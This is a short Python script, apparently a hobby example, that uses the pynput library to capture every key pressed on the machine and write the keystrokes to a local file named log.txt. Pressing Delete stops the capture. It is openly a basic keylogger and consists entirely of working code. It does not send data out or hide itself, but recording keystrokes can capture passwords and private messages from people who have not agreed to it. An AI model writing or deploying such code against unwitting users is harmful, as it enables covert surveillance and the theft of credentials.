from pynput.keyboard import Key, Listener

logger = open("log.txt","w")
 
def show(key):

    if(key == Key.space):
        logger.write(" ")

    elif(key == Key.enter):
        logger.write("\n")

    elif key == Key.delete:
        return False

    else:
        logger.write(str(key).replace("'", ""))
        print('\nYou Entered {0}'.format(key))
 
with Listener(on_press = show) as listener:   
    listener.join()